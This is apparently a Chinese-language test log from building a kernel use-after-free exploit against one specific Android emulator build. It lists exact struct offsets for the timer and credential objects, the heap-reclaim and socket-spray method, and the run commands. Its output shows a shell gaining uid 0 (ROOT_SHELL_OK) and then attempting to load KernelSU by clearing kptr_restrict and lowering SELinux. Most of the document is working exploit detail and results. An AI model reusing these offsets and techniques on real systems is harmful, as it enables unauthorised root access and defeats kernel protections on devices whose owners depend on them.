- 时间：2026-11-03（America/Toronto）
- 分支 / HEAD：`dev-nocpp` / `b119085915748a940740d7ce919b5a30ed8e9346`
- 对象：`GLK98260_TARGET_PROFILE=AVD_61`，参数修订 `avd-61-r11`
- 环境：`GhostLock_6_1`，8 vCPU，冷机，KernelSU 未加载，SELinux Enforcing
- 内核：`6.1.23-android14-4-00257-g7e35917775b8-ab9964412`
- Kernel Image SHA-256：`72bf4b196dc13f1912f2763116cedd6e46b3e0b0e6388897a94dd0ba20a9c69b`

## 范围与硬前置

本记录只证明上述精确 AVD，不等同于物理 Android 设备。有效启动命令固定包含 `-cores 8`；默认
4 vCPU 实例会改变 `posix_timers_cache` 几何，已排除。运行前实测 shell 为 uid/gid 2000、
`u:r:shell:s0`、group `readtracefs`，`kernelsu` module absent，SELinux Enforcing。

精确 profile 事实：`k_itimer=0x100`、node `+0x78`、32 objects/order-1 slab；task
`cred=+0x788`、`real_cred=+0x780`；cred `CapInh=+0x28`、`CapPrm=+0x30`、
`CapEff=+0x38`；direct-map calibration `0xffffff7fc0000000`；timer/cred/task call sites
`0x1996d4` / `0xf1bd0` / `0xb627c`。这些值来自精确 Image/BTF/kallsyms/disassembly，运行时仍独立
校准 base、slide、event id 与 PFN。

## 分阶段设备结果

### ids → leak → real-cred

命令：`adb -s emulator-5554 shell timeout -k 5 240 /data/local/tmp/gl98260-avd-r1`

```text
[ids] page_alloc=262 page_free=260 pairs=1029
[base] made=512 best=0xffffff7fc0000000 count=480 slide=0
[cred] ... R=0xffffff80c35d1540 site_low=0xf1bd0 recs=1 ... task_recs=1
[prereq] PASS trigger=killable-mmap-lock
[real-verify] attempt=1/3 uid=0 euid=2000
[child] setresgid(0)=0 errno=0
[child] setuid(0)=0 errno=0 resuid=0/0/2000
uid=0(root) ... context=u:r:shell:s0
ROOT_SHELL_OK
[REAL_CRED_PASS] report=1 child=1 held=0 must_reboot=1
ADB_EXIT_STATUS: 0
```

判定：`ids`、leak、同 PFN reclaim、real cred 零写与 child readback 均 PASS；这只得到 shell domain
内 uid 0，不等于 KernelSU。

### r10：到达 ksud，但 handoff 失败

命令：`adb -s emulator-5554 shell /data/local/tmp/gl98260_avd_r10 fake`

```text
[ksu-verify] ... CapInh=0xffffff80274ffd78 required=0x10000
[ksu-verify] ... CapPrm=0xffffff81f3738778 required=0x10000
[ksu] loader resuid=0/0/2000 ... CapEff=0 CapAmb=0x10000
[ksu-worker] ... CapPrm=0x10000 CapEff=0x10000 CapAmb=0x10000
[ksu] worker=6163 status=0 loaded=0
[KSU_HANDOFF_FAIL] ...
adb_exit=2
```

同次 logcat 给出决定性根因：

```text
KernelSU: Loading kernelsu.ko for KMI android14-6.1...
KernelSU: Error: Failed to load kernelsu.ko
Caused by: 0: Cannot parse kallsyms
           1: Operation not permitted (os error 1)
```

运行时 `kptr_restrict=2`，`/proc/kallsyms` 地址为零。r10 失败路径还把 SELinux 留在 Permissive；
该实例随即冷停，未在污染状态重跑。

### r11：修复已编译，门禁在到达修复前停止

r11 在 capability/uid promotion 后临时写 `kptr_restrict=0`，worker exec 前读回；无论 module 是否
出现，都恢复原 `kptr_restrict` 并恢复 SELinux Enforcing。两次独立冷机运行结果：

1. `cap_permitted` attempt 5：`free_seen=1 burst hit=0 after 15000ms`，held zombie，park；
2. `cap_inheritable` attempt 2：`free_seen=1 burst hit=0 after 15000ms`，held zombie，park。

两次均为 Enforcing、module absent，且都未执行 r11 的 kptr/ksud 分支。依门禁“同批连续失败两次即
停”，结果记为 INDETERMINATE，不再增加随机重试。

## 所有权、UAF 边界与终结点复核

| 对象 | 创建/所有者 | 借用与访问窗口 | 终结点/释放 |
| --- | --- | --- | --- |
| child C 与 real cred | parent fork；内核 cred owner | parent 只借用 trace 泄漏地址；C 在 pipe 上阻塞 | C 完成 verify/commit 后退出；parent waitpid |
| victim timer/node | target task/内核 timer subsystem | 仅漏洞原语允许 stale node；辅助对象不得 UAF | 未命中时持有 zombie 并冷重启；命中后才 reap |
| AF_UNIX socket pool | exploit parent | spray threads 与 trace oracle 在 reclaim 窗口借用 | clean retry 才 drain；held miss 不回收，冷重启 |
| ksud copy/worker | shell pre-copy；uid-0 child fork worker | worker exec 消费；parent child 轮询 `/proc/modules` | waitpid worker；随后共同 cleanup；冷重启清除 LKM |
| `kptr_restrict`/SELinux | kernel global state | 只在 uid-0 handoff 窗口临时修改 | r11 共用 cleanup 恢复；若此前 park，则状态尚未修改 |

顺序保持为：停止 stale-node 访问/确认 reclaim → reap 触发单次写 → child 验证 → KSU worker →
module readback → 恢复 sysctl/SELinux → child/parent 结束。辅助 pipe、trace buffer、worker 与同步资源
没有被扩展成 UAF 目标。
